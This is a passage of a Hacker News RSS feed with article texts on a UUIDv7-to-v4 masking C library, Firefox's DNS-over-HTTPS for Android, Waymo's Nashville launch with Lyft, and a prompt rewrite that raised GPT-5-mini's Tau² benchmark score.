<li><a href="https://9to5google.com/2025/08/26/youtube-for-android-tv-google-tv-beta-program/">YouTube for Android TV, Google TV will now let you test new features in beta</a></li>



<li><a href="https://9to5google.com/2025/08/08/fix-unwanted-youtube-recommendations/">YouTube recommending awful videos? Here’s how to fix that</a></li>



<li><a href="https://9to5google.com/2025/07/30/youtube-new-profanity-guidelines-utilizes-ai-identify-teens/">YouTube rolls out new profanity guidelines for creators</a></li>
</ul>



<p><em><strong>Follow Ben:</strong>&nbsp;<a href="https://twitter.com/NexusBen" target="_blank" rel="noreferrer noopener">Twitter/X</a>,&nbsp;<a href="https://www.threads.net/@nexusben" target="_blank" rel="noreferrer noopener">Threads</a>, <a href="https://bsky.app/profile/nexusben.com">Bluesky</a>, and&nbsp;<a href="https://www.instagram.com/nexusben" target="_blank" rel="noreferrer noopener">Instagram</a></em></p>
	<p>
				<a target="_blank" rel="nofollow" href="https://news.google.com/publications/CAAqBwgKMMqA-Qow-c_gAg?hl=en-US&amp;gl=US&amp;ceid=US:en">
			<em>Add 9to5Google to your Google News feed.</em>&nbsp;
					</a>
			</p>
	<p><em>FTC: We use income earning auto affiliate links.</em> <a href="https://9to5mac.com/about/#affiliate">More.</a></p>				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UUIDv47: Store UUIDv7 in DB, emit UUIDv4 outside (SipHash-masked timestamp) (157 pts)]]></title>
            <link>https://github.com/stateless-me/uuidv47</link>
            <guid>45275973</guid>
            <pubDate>Wed, 17 Sep 2025 14:02:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/stateless-me/uuidv47">https://github.com/stateless-me/uuidv47</a>, See on <a href="https://news.ycombinator.com/item?id=45275973">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">UUIDv47 - UUIDv7-in / UUIDv4-out (SipHash-masked timestamp)</h2><a id="user-content-uuidv47---uuidv7-in--uuidv4-out-siphash-masked-timestamp" aria-label="Permalink: UUIDv47 - UUIDv7-in / UUIDv4-out (SipHash-masked timestamp)" href="#uuidv47---uuidv7-in--uuidv4-out-siphash-masked-timestamp"></a></p>
<p dir="auto">uuidv47 lets you store sortable UUIDv7 in your database while emitting a
UUIDv4-looking façade at your API boundary. It does this by XOR-masking
only the UUIDv7 timestamp field with a keyed SipHash-2-4 stream tied to
the UUID’s own random bits.</p>
<ul dir="auto">
<li>Header-only C (C89) · zero deps</li>
<li>Deterministic, invertible mapping (exact round-trip)</li>
<li>RFC-compatible version/variant bits (v7 in DB, v4 on the wire)</li>
<li>Key-recovery resistant (SipHash-2-4, 128-bit key)</li>
<li>Full tests provided</li>
</ul>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Table of contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li>Why</li>
<li>Quick start</li>
<li>Public API</li>
<li>Specification
<ul dir="auto">
<li>UUIDv7 bit layout</li>
<li>Façade mapping (v7 ↔ v4)</li>
<li>SipHash message derived from random</li>
<li>Invertibility</li>
<li>Collision analysis</li>
</ul>
</li>
<li>Security model</li>
<li>Build, test, coverage</li>
<li>Integration tips</li>
<li>Performance notes</li>
<li>FAQ</li>
<li>License</li>
</ul>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why</h2><a id="user-content-why" aria-label="Permalink: Why" href="#why"></a></p>
<ul dir="auto">
<li>DB-friendly: UUIDv7 is time-ordered → better index locality &amp; pagination.</li>
<li>Externally neutral: The façade hides timing patterns and looks like v4 to clients/systems.</li>
<li>Secret safety: Uses a PRF (SipHash-2-4). Non-crypto hashes are not suitable when the key must not leak.</li>
</ul>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Quick start</h2><a id="user-content-quick-start" aria-label="Permalink: Quick start" href="#quick-start"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="#include <stdio.h>
#include &quot;uuidv47.h&quot;

int main(void){
  const char* s = &quot;00000000-0000-7000-8000-000000000000&quot;;
  uuid128_t v7;
  if (!uuid_parse(s, &amp;v7)) return 1;
  uuidv47_key_t key = { .k0 = 0x0123456789abcdefULL, .k1 = 0xfedcba9876543210ULL };
  uuid128_t facade = uuidv47_encode_v4facade(v7, key);
  uuid128_t back = uuidv47_decode_v4facade(facade, key);

  char a[37], b[37], c[37];
  uuid_format(&amp;v7, a);
  uuid_format(&amp;facade, b);
  uuid_format(&amp;back, c);
  printf(&quot;v7 (DB) : %s\n&quot;, a);
  printf(&quot;v4 (API): %s\n&quot;, b);
  printf(&quot;back    : %s\n&quot;, c);
}"><pre><span>#include</span> <span>&lt;stdio.h&gt;</span>
<span>#include</span> <span>"uuidv47.h"</span>

<span>int</span> <span>main</span>(<span>void</span>){
  <span>const</span> <span>char</span><span>*</span> <span>s</span> <span>=</span> <span>"00000000-0000-7000-8000-000000000000"</span>;
  <span>uuid128_t</span> <span>v7</span>;
  <span>if</span> (!<span>uuid_parse</span>(<span>s</span>, <span>&amp;</span><span>v7</span>)) <span>return</span> <span>1</span>;
  <span>uuidv47_key_t</span> <span>key</span> <span>=</span> { .<span>k0</span> <span>=</span> <span>0x0123456789abcdefULL</span>, .<span>k1</span> <span>=</span> <span>0xfedcba9876543210ULL</span> };
  <span>uuid128_t</span> <span>facade</span> <span>=</span> <span>uuidv47_encode_v4facade</span>(<span>v7</span>, <span>key</span>);
  <span>uuid128_t</span> <span>back</span> <span>=</span> <span>uuidv47_decode_v4facade</span>(<span>facade</span>, <span>key</span>);

  <span>char</span> <span>a</span>[<span>37</span>], <span>b</span>[<span>37</span>], <span>c</span>[<span>37</span>];
  <span>uuid_format</span>(<span>&amp;</span><span>v7</span>, <span>a</span>);
  <span>uuid_format</span>(<span>&amp;</span><span>facade</span>, <span>b</span>);
  <span>uuid_format</span>(<span>&amp;</span><span>back</span>, <span>c</span>);
  <span>printf</span>(<span>"v7 (DB) : %s\n"</span>, <span>a</span>);
  <span>printf</span>(<span>"v4 (API): %s\n"</span>, <span>b</span>);
  <span>printf</span>(<span>"back    : %s\n"</span>, <span>c</span>);
}</pre></div>
<p dir="auto">Build &amp; run with the provided Makefile:
make test
make coverage
sudo make install</p>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Public API</h2><a id="user-content-public-api" aria-label="Permalink: Public API" href="#public-api"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="typedef struct { uint8_t  b[16]; } uuid128_t;
typedef struct { uint64_t k0, k1; } uuidv47_key_t;

uuid128_t uuidv47_encode_v4facade(uuid128_t v7, uuidv47_key_t key);
uuid128_t uuidv47_decode_v4facade(uuid128_t v4_facade, uuidv47_key_t key);
int  uuid_version(const uuid128_t* u);
void set_version(uuid128_t* u, int ver);
void set_variant_rfc4122(uuid128_t* u);
bool uuid_parse (const char* str, uuid128_t* out);
void uuid_format(const uuid128_t* u, char out[37]);"><pre><span>typedef</span> <span>struct</span> { <span>uint8_t</span>  <span>b</span>[<span>16</span>]; } <span>uuid128_t</span>;
<span>typedef</span> <span>struct</span> { <span>uint64_t</span> <span>k0</span>, <span>k1</span>; } <span>uuidv47_key_t</span>;

<span>uuid128_t</span> <span>uuidv47_encode_v4facade</span>(<span>uuid128_t</span> <span>v7</span>, <span>uuidv47_key_t</span> <span>key</span>);
<span>uuid128_t</span> <span>uuidv47_decode_v4facade</span>(<span>uuid128_t</span> <span>v4_facade</span>, <span>uuidv47_key_t</span> <span>key</span>);
<span>int</span>  <span>uuid_version</span>(<span>const</span> <span>uuid128_t</span><span>*</span> <span>u</span>);
<span>void</span> <span>set_version</span>(<span>uuid128_t</span><span>*</span> <span>u</span>, <span>int</span> <span>ver</span>);
<span>void</span> <span>set_variant_rfc4122</span>(<span>uuid128_t</span><span>*</span> <span>u</span>);
<span>bool</span> <span>uuid_parse</span> (<span>const</span> <span>char</span><span>*</span> <span>str</span>, <span>uuid128_t</span><span>*</span> <span>out</span>);
<span>void</span> <span>uuid_format</span>(<span>const</span> <span>uuid128_t</span><span>*</span> <span>u</span>, <span>char</span> <span>out</span>[<span>37</span>]);</pre></div>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Specification</h2><a id="user-content-specification" aria-label="Permalink: Specification" href="#specification"></a></p>
<p dir="auto">UUIDv7 bit layout:</p>
<ul dir="auto">
<li>ts_ms_be: 48-bit big-endian timestamp</li>
<li>ver:      high nibble of byte 6 = 0x7 (v7) or 0x4 (façade)</li>
<li>rand_a:   12 random bits</li>
<li>var:      RFC variant (0b10)</li>
<li>rand_b:   62 random bits</li>
</ul>
<p dir="auto">Façade mapping:</p>
<ul dir="auto">
<li>Encode: ts48 ^ mask48(R), set version=4</li>
<li>Decode: encTS ^ mask48(R), set version=7</li>
<li>Random bits unchanged</li>
</ul>
<p dir="auto">SipHash input: 10 bytes from random field:
msg[0] = (byte6 &amp; 0x0F)
msg[1] = byte7
msg[2] = (byte8 &amp; 0x3F)
msg[3..9] = bytes9..15</p>
<p dir="auto">Invertibility: XOR mask is reversible with known key.</p>
<p dir="auto">Collision analysis: Injective mapping. Only risk is duplicate randoms per ms.</p>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Security model</h2><a id="user-content-security-model" aria-label="Permalink: Security model" href="#security-model"></a></p>
<ul dir="auto">
<li>Goal: Secret key unrecoverable even with chosen inputs.</li>
<li>Achieved: SipHash-2-4 is a keyed PRF.</li>
<li>Keys: 128-bit. Derive via HKDF.</li>
<li>Rotation: store small key ID outside UUID.</li>
</ul>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Build, test, coverage</h2><a id="user-content-build-test-coverage" aria-label="Permalink: Build, test, coverage" href="#build-test-coverage"></a></p>
<div data-snippet-clipboard-copy-content="make test
make coverage
make debug
sudo make install"><pre><code>make test
make coverage
make debug
sudo make install
</code></pre></div>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Integration tips</h2><a id="user-content-integration-tips" aria-label="Permalink: Integration tips" href="#integration-tips"></a></p>
<ul dir="auto">
<li>Do encode/decode at API boundary.</li>
<li>For Postgres, write tiny C extension.</li>
<li>For sharding, hash v4 façade with xxh3 or SipHash.</li>
</ul>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">Performance</h2><a id="user-content-performance" aria-label="Permalink: Performance" href="#performance"></a></p>
<p dir="auto">SipHash-2-4 on 10-byte message is extremely fast. No allocations.</p>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">FAQ</h2><a id="user-content-faq" aria-label="Permalink: FAQ" href="#faq"></a></p>
<p dir="auto">Q: Why not xxHash with a secret?
A: Not a PRF; secret can leak. Use SipHash.</p>
<p dir="auto">Q: Is façade indistinguishable from v4?
A: Yes, variable bits uniform, version/variant set to v4.</p>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">MIT, Copyright (c) 2025 Stateless Limited</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Firefox 143 for Android to introduce DoH (196 pts)]]></title>
            <link>https://blog.mozilla.org/en/firefox/dns-android/</link>
            <guid>45275444</guid>
            <pubDate>Wed, 17 Sep 2025 13:14:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.mozilla.org/en/firefox/dns-android/">https://blog.mozilla.org/en/firefox/dns-android/</a>, See on <a href="https://news.ycombinator.com/item?id=45275444">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
  <main id="main">

    
<article id="post-81686">
  

  <div>
    
<div><p>All web browsing starts with a DNS query to find the IP address for the desired service or website. For much of the internet’s history, this query is sent in the clear. <a href="https://en.wikipedia.org/wiki/DNS_over_HTTPS">DNS-over-HTTPS (DoH)</a> plugs this privacy leak by encrypting the DNS messages, so no one on the network, not your internet service provider or a free public WiFi provider, can eavesdrop on your browsing.</p><p>In 2020, Firefox became the first browser to roll out <a href="https://blog.mozilla.org/en/firefox/firefox-continues-push-to-bring-dns-over-https-by-default-for-us-users/"><strong>DoH by default</strong></a>, starting in the United States and in 2023, we announced the Firefox <a href="https://blog.mozilla.org/en/mozilla/news/firefox-by-default-dns-over-https-rollout-in-canada/">DoH-by-default rollout in Canada</a>, powered by our trusted partner, the Canadian Internet Registration Authority (CIRA).</p></div>



<p>This year, we’ve built on that foundation and delivered major performance improvements and mobile support, ensuring more Firefox users benefit from privacy without compromise.</p>



<h2><strong>Introducing DoH for Android</strong></h2>



<p>After bringing encrypted DNS protection to millions of desktop users, we’re now extending the same to mobile. Firefox users who have been waiting for DoH on Android can now turn it on and browse with the same privacy protections as on their desktops.</p>



<p>Starting with this week’s release of <strong>Firefox 143 for Android</strong>, users can choose to enable DoH in Firefox on their mobile devices by selecting “<a href="https://support.mozilla.org/en-US/kb/configure-dns-over-https-protection-levels-firefox-android#w_increased-protection">Increased Protection”</a> DoH configuration. Performance testing with <a href="https://wiki.mozilla.org/Security/DOH-resolver-policy#Conforming_Resolvers">Firefox DoH partners</a> is currently underway. If DoH is as fast as we expect, we plan to enable it by default for Android users in certain regions, similar to desktop users. Until then, these configuration options provide you the choice to opt in early.</p>


<div>
<figure><img decoding="async" width="683" height="1024" src="https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image-683x1024.png" alt="" srcset="https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image-683x1024.png 683w, https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image-200x300.png 200w, https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image-768x1152.png 768w, https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image-1000x1500.png 1000w, https://blog.mozilla.org/wp-content/blogs.dir/278/files/2025/09/image.png 1024w" sizes="(max-width: 683px) 100vw, 683px"><figcaption><em>Enable DoH in Firefox on Android</em></figcaption></figure></div>


<h2><strong>DoH performance breakthroughs in 2025</strong></h2>



<p>DNS resolution speed is critical to the browsing experience — when web pages involve multiple DNS queries, the speed difference compounds and can cause page loads to be slow. Since we first rolled out DoH in Canada, we’ve worked closely with CIRA for reliability and performance measurements. Through our strong collaboration with them and their technology partner Akamai, Firefox DoH lookups are now <strong>61% faster</strong> year-to-date for the 75th percentile.</p>



<p>With these performance improvements, DoH resolution time is now within a millisecond or two of native DNS resolution. This is a big win because <strong>Firefox users in Canada now get the privacy of encrypted DNS with no performance penalty</strong>.</p>



<p>Although the investigation and analysis started with the desire to improve DoH in Firefox, the benefits didn’t end there. Our collaboration also improved CIRA DoH performance for many of its DNS users, including Canadian universities, as well as other DNS providers relying on CIRA’s or Akamai’s server implementations.</p>



<p>This is a win not just for Firefox users, but for the many other users around the globe.</p>



<h2><strong>Robust privacy on your terms</strong></h2>



<p>We have always approached DoH with an emphasis on transparency, user choice, and strong privacy safeguards. Firefox gives users meaningful control over how their DNS traffic is handled: Users can opt out, choose their own resolver, or adjust DoH protection levels, and Firefox makes it clear what DoH is doing and why it matters.</p>



<p>Firefox enforces strict requirements for DNS resolvers before trusting them with your browsing. Not every DNS provider can become a DoH provider in Firefox — only those that meet and attest to Mozilla’s rigorous <a href="https://wiki.mozilla.org/Security/DOH-resolver-policy">Trusted Recursive Resolver (TRR) policy</a> through a legally binding contract.</p>



<h2><strong>Prioritizing your privacy and speed</strong></h2>



<p>Our work with DoH this year shows what’s possible when privacy and performance go hand-in-hand. We’ve proven that encrypted DNS can be fast, reliable, and available on desktop and Android. Just as importantly, we’ve shown that partnerships grounded in open standards and accountability can deliver benefits not only to Firefox users but to the wider internet.</p>



<p>As we look forward, our commitment stays the same: Privacy should be the default, speed should never be a compromise, and the web should remain open and accessible to everyone. Choosing Firefox means choosing a browser that is built for you and for a better internet.</p>



<a href="https://www.mozilla.org/firefox/new/">
  <p><img width="800" height="800" src="https://blog.mozilla.org/wp-content/blogs.dir/278/files/2021/10/Visual-Guidelines-800x800.png" alt="" decoding="async" srcset="https://blog.mozilla.org/wp-content/blogs.dir/278/files/2021/10/Visual-Guidelines-800x800.png 800w, https://blog.mozilla.org/wp-content/blogs.dir/278/files/2021/10/Visual-Guidelines-150x150.png 150w" sizes="(max-width: 800px) 100vw, 800px">  </p>
  <div>
     <h3>Download Firefox</h3>      <p><span>Get the browser that protects what’s important</span>   </p></div>
</a>
  </div>

</article><!-- #post-81686 -->

  </main><!-- #main -->
  

<div id="related-articles">
    <h2>Related Articles</h2>
    
  </div>



</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Bringing fully autonomous rides to Nashville, in partnership with Lyft (129 pts)]]></title>
            <link>https://waymo.com/blog/2025/09/waymo-is-coming-to-nashville-in-partnership-with-lyft</link>
            <guid>45275415</guid>
            <pubDate>Wed, 17 Sep 2025 13:10:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://waymo.com/blog/2025/09/waymo-is-coming-to-nashville-in-partnership-with-lyft">https://waymo.com/blog/2025/09/waymo-is-coming-to-nashville-in-partnership-with-lyft</a>, See on <a href="https://news.ycombinator.com/item?id=45275415">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article aria-labelledby="P0-7-title"><div><p>We’re on our way to Music City! We’re excited to bring the magic of Waymo’s fully autonomous ride-hailing service to riders in Nashville, in partnership with Lyft.</p><p>Our generalizable Waymo Driver has become even more capable as we’ve scaled to hundreds of thousands of fully autonomous rides each week across five major U.S. cities. We’ll start fully autonomous operations in Nashville in the coming months, and open to public riders next year. We’ll do so by pairing our world-leading technology and seamless ride-hailing service with Lyft’s proven track record of fleet management through its Flexdrive subsidiary.</p><p>We’re also excited to offer riders in Nashville even more ways to ride with Waymo. Riders will hail via the Waymo app, and as our service grows, riders will also be able to use the Lyft app to match with a Waymo vehicle. We’re thrilled for even more people to have access to our ride-hailing service, as we work towards our mission to be the world’s most trusted driver.</p><p>“We’re delighted to partner with Lyft and launch in Nashville next year, as we continue to scale our Waymo ride-hailing service to more people in more places,” said Waymo co-CEO Tekedra Mawakana. “Lyft’s extensive fleet management capabilities through Flexdrive make them an ideal partner for expanding to Nashville. We can’t wait to introduce Music City’s residents and visitors to the convenient, consistent, safe, and magical Waymo experience.”</p><p>"This partnership brings together best-in-class autonomous vehicles with best-in-class customer experience," said Lyft CEO David Risher. "Waymo has proven that its autonomous technology works at scale. When combined with Lyft's customer-obsession and world-class fleet management capabilities, it's two great tastes that go great together."</p><p>With more than 100 million fully autonomous miles driven on public roads, the <a href="https://waymo.com/safety/impact/"><u>data</u></a> shows Waymo’s technology is significantly safer than human drivers in the areas where we operate. Nashville joins a growing list of cities that will soon have access to Waymo.</p><p>“As families and businesses move to Tennessee in record numbers, our state continues to lead the nation in finding innovative solutions to transportation challenges," said Governor Bill Lee.<b> </b>"By leveraging private sector technologies like Waymo's fully autonomous vehicles, we're exploring possibilities we couldn't achieve on our own, and further accelerating economic growth. I look forward to Waymo's launch in The Volunteer State.”</p><p>We’re looking forward to serving the people of Nashville soon. If you’re interested in following our journey or want to help bring Waymo to your city next, sign up at <a href="http://waymo.com/updates"><u>waymo.com/updates</u></a>.</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Tau² Benchmark: How a Prompt Rewrite Boosted GPT-5-Mini by 22% (162 pts)]]></title>
            <link>https://quesma.com/blog/tau2-benchmark-improving-results-smaller-models/</link>
            <guid>45275354</guid>
            <pubDate>Wed, 17 Sep 2025 13:03:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://quesma.com/blog/tau2-benchmark-improving-results-smaller-models/">https://quesma.com/blog/tau2-benchmark-improving-results-smaller-models/</a>, See on <a href="https://news.ycombinator.com/item?id=45275354">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-astro-cid-xj2uyz6m="">  <p><strong>Now on the front page of Hacker News — <a href="https://news.ycombinator.com/item?id=45275354">join the discussion</a>.</strong></p>
<p>In <a href="https://quesma.com/blog/tau2-from-llm-benchmark-to-blueprint-for-testing-ai-agents/">a recent post</a>, we introduced the Tau² benchmark, a framework for benchmaring LLMs. Today we’re sharing a surprising discovery we made while using it: a simple <strong>prompt rewrite boosted a small model’s success rate by over 20%</strong>. This post is a deep-dive on how we found and fixed this performance bottleneck by making subtle changes to agent policies.</p>
<h2 id="benchmarking-llms-with-tau">Benchmarking LLMs with Tau²</h2>
<p>On the recent OpenAI Summer Update, we have seen that GPT-5 model has made significant strides in agentic tasks. To validate these claims, they’ve turned to the Tau² benchmark, which simulates real-world agent interactions across various domains like telecom, retail, and airlines.</p>
<p>Before moving any further, we have to establish that GPT-5 showed significant improvement only in one benchmark domain - which is Telecom. The other ones have been somehow overlooked during model presentation - therefore we won’t bother about them either (😉).</p>
<p><img alt="Bar chart comparing GPT-5, OpenAI o3, and GPT-4.1 tool use accuracy in telecom, retail, and airline" loading="lazy" decoding="async" fetchpriority="auto" width="1999" height="947" src="https://quesma.com/_astro/image2.3Ev8Kk46_Z2q2E1W.webp"></p>
<p>In agentic interactions, accuracy is non-negotiable, but model speed is equally vital for user experience. Therefore, it makes sense to consider alternatives to flagship models, such as the recently introduced GPT-5-mini.</p>
<p>GPT-5-mini offers significant advantages: it’s roughly twice as fast in latency and noticeably more efficient in throughput. While delivering 85–95% of the full GPT-5’s performance, it is also five times cheaper.</p>
<p>Therefore, we ran an experiment to explore two things:</p>
<ul>
<li>How well GPT-5-mini performs on this benchmark.</li>
<li>Whether we can improve its results by making subtle changes to the domain, such as modifying agent policies or task descriptions.</li>
</ul>
<h2 id="baseline-expect-gpt-5-mini-to-fail-45-of-the-time">Baseline: Expect GPT-5-mini to Fail 45% of the Time</h2>
<p><img alt="GPT-5, GPT-5 mini, and GPT-5 nano model options with descriptions" loading="lazy" decoding="async" fetchpriority="auto" width="1902" height="572" src="https://quesma.com/_astro/image3.CmeGdum5_1a59hL.webp"></p>
<p>Firstly, we’re going to establish the benchmark for the GPT-5-mini model. As the telecom benchmark contains over 100 tests, we’ll use their subset. Luckily, the telecom_small task set comes in handy with just 20 test scenarios.</p>
<p>Running the benchmark with:</p>
<pre tabindex="0" data-language="bash"><code><span><span>tau2</span><span> run</span><span> \</span></span>
<span><span>    --domain</span><span> telecom</span><span> \</span></span>
<span><span>    --agent-llm</span><span> gpt-5-mini</span><span> \</span></span>
<span><span>    --user-llm</span><span> gpt-5-mini</span><span> \</span></span>
<span><span>    --num-trials</span><span> 2</span><span> --task-set-name</span><span> telecom_small</span></span></code></pre>
<p>Our results are:
<img alt="Simulation results showing average reward 0.55 and cost per conversation $0.0292" loading="lazy" decoding="async" fetchpriority="auto" width="1999" height="412" src="https://quesma.com/_astro/image4.B03mMqZq_1aIjlH.webp"></p>
<p>We ended up running 40 simulations:<br>
<img alt="Simulation task results with green checkmarks and red Xs showing successes and failures" loading="lazy" decoding="async" fetchpriority="auto" width="1950" height="1414" src="https://quesma.com/_astro/image5.CyupezbJ_Z1blhYq.webp"></p>
<p>The initial success rate was low: <strong>just 55%</strong>. The GPT-5-mini with its limited reasoning capabilities doesn’t even get close to flagship GPT-5.</p>
<p>There’s an additional interesting metric this benchmark has introduced, which is pass^k. This measures how well an agent can perform when it’s challenged with the same task k times. I like to think of it as the <strong>reliability of the AI Agent</strong>.<br>
Another intriguing aspect of this benchmark are tasks which failed for all given trials - which could imply that the <strong>AI Agent is simply not capable of handling at all</strong>. This can happen due to multiple factors - reasoning might be too difficult, user ask could not be specific enough, etc.</p>
<h2 id="the-hack-using-claude-to-rewrite-prompts-for-gpt-5-mini">The Hack: Using Claude to Rewrite Prompts for GPT-5-mini</h2>
<p>When hacking the AI Agent for <code>GPT-5-mini</code> model we aimed to answer three questions:</p>
<ul>
<li>Can I improve the overall success rate when using this limited model?</li>
<li>Are we able to “unlock” more tasks which agents are capable of handling?</li>
<li>Does agent reliability improve?</li>
</ul>
<p>The beauty of generative AI is that we could offload lots of work and allow ourselves a little laziness. Therefore, we asked Claude to analyze the AI agent policies in the telecom domain, which are the building blocks for the agent prompt. From there, we asked specifically to assume that these policies are going to feed an AI Agent prompt, which will be using faster, non-flagship LLM. Output documents (<code>main_policy.md</code> and <code>tech_support_manual.md</code>) will have to be rephrased so that they are easier to follow for the agent and result in improving its behaviour.</p>
<p>Here’s the “executive summary” of improvements it made:</p>
<pre tabindex="0" data-language="markdown"><code><span><span>I've created two AI-optimized versions of the telecom domain documentation:</span></span>
<span></span>
<span><span>Key Improvements Made:</span></span>
<span></span>
<span><span>1.</span><span> Structure &amp; Flow</span></span>
<span><span>   -</span><span> Decision Trees: Clear branching logic with ├── and └── notation</span></span>
<span><span>   -</span><span> Sequential Steps: Numbered, ordered procedures instead of scattered explanations</span></span>
<span><span>   -</span><span> Prerequisites: Explicit dependency checks before proceeding</span></span>
<span></span>
<span><span>2.</span><span> AI Agent Optimizations</span></span>
<span><span>   -</span><span> Tool Call Clarity: Exact function names and parameters</span></span>
<span><span>   -</span><span> Binary Decisions: Clear yes/no conditions instead of ambiguous language</span></span>
<span><span>   -</span><span> Error Handling: Specific failure conditions and next steps</span></span>
<span><span>   -</span><span> Verification Steps: "Recheck" instructions after each fix</span></span>
<span></span>
<span><span>3.</span><span> Cognitive Load Reduction</span></span>
<span><span>   -</span><span> Reference Tables: Quick lookup for tools and purposes</span></span>
<span><span>   -</span><span> Pattern Recognition: Common issue combinations and their solutions</span></span>
<span><span>   -</span><span> Critical Reminders: Common AI mistakes section to prevent errors</span></span>
<span></span>
<span><span>4.</span><span> Actionable Language</span></span>
<span><span>   -</span><span> Removed verbose explanations mixed with instructions</span></span>
<span><span>   -</span><span> Consolidated multiple documents' logic into single workflows</span></span>
<span><span>   -</span><span> Used imperative commands: "Check X", "If Y then Z"</span></span>
<span><span>   -</span><span> Added immediate verification steps</span></span></code></pre>
<p>We’ve moved from lengthy policy declarations to clear, directive instructions. Instead of wordy statements, the new style uses step-by-step logic, conditions, and patterns. For prompts, this works more like a checklist — “Check X → If Y, then Z” — rather than vague, descriptive policies.</p>
<h2 id="the-result-22-accuracy-boost-and-50-fewer-unsolvable-tasks">The Result: 22% Accuracy Boost and 50% Fewer Unsolvable Tasks</h2>
<p>Let’s review what our improved AI agent results look like:</p>
<p><img alt="Simulation results showing agent metrics with rewards, pass rates, and cost per conversation" loading="lazy" decoding="async" fetchpriority="auto" width="1999" height="435" src="https://quesma.com/_astro/image6.Djj-zTez_RWCcw.webp"></p>
<p>The new prompts led to a significant performance boost.
Pass^k metrics surged:</p>
<ul>
<li>k=1 from 0.55 to 0.675 (<strong>a 22.73% improvement</strong>) → In plain terms, GPT-5-mini now succeeds on <strong>67.5% of tasks instead of 55%</strong>.</li>
<li>k=2 from 0.4 to 0.5 (<strong>a 25% improvement</strong>) → Meaning retries became more effective too.</li>
</ul>
<p>For context, flagship GPT-5 scores ~97% on this benchmark, o3 comes in at 58%, and GPT-4.1 at 34%. With our optimized prompts, GPT-5-mini not only jumped well above its own baseline but also <strong>outperformed o3</strong>, landing much closer to GPT-5 than before.</p>
<p>The side-by-side comparison shows exactly where the gains came from. On the left side of the screen you’ll see the “stock” AI agent results, on the right - our AI agent improved for GPT-5-mini.</p>
<p><img alt="Side-by-side console logs comparing stock AI results with improved GPT-5-mini test runs" loading="lazy" decoding="async" fetchpriority="auto" width="1999" height="722" src="https://quesma.com/_astro/image7.BWRFnxLy_2mRVVB.webp"></p>
<p>The screenshot above outlines that with our updated prompts and policies, <strong>we managed to “unlock” some of the tests which were previously always failing</strong> due to GPT-5-mini’s limited capabilities. Now there are only 3 tasks, which the agent didn’t manage to solve at all within the given 2 trials - compared to 6.</p>
<h2 id="key-takeaways-for-your-own-models">Key Takeaways for Your Own Models</h2>
<p>This experiment shows that thoughtful prompt design can meaningfully boost the performance of smaller models like GPT-5-mini. By restructuring policies into clear, step-by-step instructions, we not only improved success rates but also “unlocked” tasks that previously seemed unsolvable for the model.</p>
<p>The key was in simplifying language, reducing ambiguity, and breaking down reasoning into explicit, actionable steps. Smaller models struggle with long-winded or fuzzy policies, but thrive when given structured flows, binary decisions, and lightweight verification steps.</p>
<p>The takeaway is clear: using a frontier model to automatically optimize prompts can unlock major improvements for smaller LLMs.
With strategic optimization, lightweight models can deliver decent results at a fraction of the cost — making them a compelling alternative when efficiency and affordability matter as much as accuracy.</p>
<p>If you found this helpful, let us know! Prompt engineering is still an open playground, and we’re excited to see what creative approaches others are exploring in this space.</p>
<p>Discuss it on <a href="https://www.linkedin.com/posts/quesma_bigger-ai-models-always-win-benchmarks-right-activity-7373757332989771776-cpc8">LinkedIn</a>, <a href="https://x.com/quesmaorg/status/1968324178215592128">X</a> or <a href="https://news.ycombinator.com/item?id=45275354">Hacker News</a>.</p>
<p><img alt="Two astronauts in space with Earth behind them, one pointing a gun at the other." loading="lazy" decoding="async" fetchpriority="auto" width="996" height="564" src="https://quesma.com/_astro/image8.B08GRvh2_RL2E0.webp"></p>
<p><strong>UPDATE:</strong> Since publishing this post and hitting <a href="https://news.ycombinator.com/item?id=45275354">the front page of HN</a>,
some readers expressed interest in seeing the actual before and after policies (which are building block for the agent prompt).
Initially I thought these would be too lengthy for the article and no one would care,
but since there’s interest, I’m happy to share them in <a href="https://github.com/mieciu/tau2-bench/pull/1/files">this Pull Request</a>.</p>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Procedural Island Generation (III) (103 pts)]]></title>
            <link>https://brashandplucky.com/2025/09/17/procedural-island-generation-iii.html</link>
            <guid>45275049</guid>
            <pubDate>Wed, 17 Sep 2025 12:29:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://brashandplucky.com/2025/09/17/procedural-island-generation-iii.html">https://brashandplucky.com/2025/09/17/procedural-island-generation-iii.html</a>, See on <a href="https://news.ycombinator.com/item?id=45275049">Hacker News</a></p>
